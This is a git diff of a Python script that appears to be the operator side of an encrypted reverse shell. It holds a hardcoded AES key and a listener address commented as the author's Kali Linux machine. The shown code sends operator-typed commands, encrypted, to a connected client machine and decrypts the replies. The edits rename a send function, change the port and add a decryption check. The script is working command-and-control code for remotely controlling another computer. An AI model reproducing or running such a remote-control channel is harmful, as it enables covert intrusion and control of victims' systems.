@@ -6,10 +6,12 @@ from Crypto.Cipher import AES
 
 
 SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
-SERVER_PORT = 8888
+SERVER_PORT = 8887
 
 #Step 4: Authentication
 key = b'\x91)\xdd\xa9\x06\xaa\x8d\xb2\xbd\x7fY\x84! \x99\xcb'
+
+
 def encrypt(msg):
   cipher = AES.new(key, AES.MODE_EAX)
   nonce = cipher.nonce
@@ -25,8 +27,7 @@ def decrypt(nonce, ciphertext, tag):
   except:
     return False
 
-
-def send_encrypted(data):
+def send(data):
     nonce, ciphertext, tag = encrypt(data)
     message = {
         'nonce': base64.b64encode(nonce).decode('utf-8'),
@@ -36,6 +37,8 @@ def send_encrypted(data):
     json_data = json.dumps(message)
     client_sock.send(json_data.encode('utf-8'))
 
+
+
 def recv_command():
     data = client_sock.recv(1024).decode('utf-8')
     try:
@@ -43,7 +46,11 @@ def recv_command():
         nonce = base64.b64decode(message['nonce'])
         ciphertext = base64.b64decode(message['ciphertext'])
         tag = base64.b64decode(message['tag'])
-        return decrypt(nonce, ciphertext, tag)
+        decrypted_command = decrypt(nonce, ciphertext, tag)
+        if decrypted_command is False:
+            print("Decryption failed.")
+            return None
+        return decrypted_command
     except ValueError as e:
         return False
 
@@ -51,7 +58,7 @@ def recv_command():
 def create_communication():
     while True:
         command = input(f'~{str(client_ip)}>>: ')
-        send_encrypted(command)
+        send(command)
         if command == 'quit' or command == 'exit':
             break
         elif command[:3] == 'cd ':
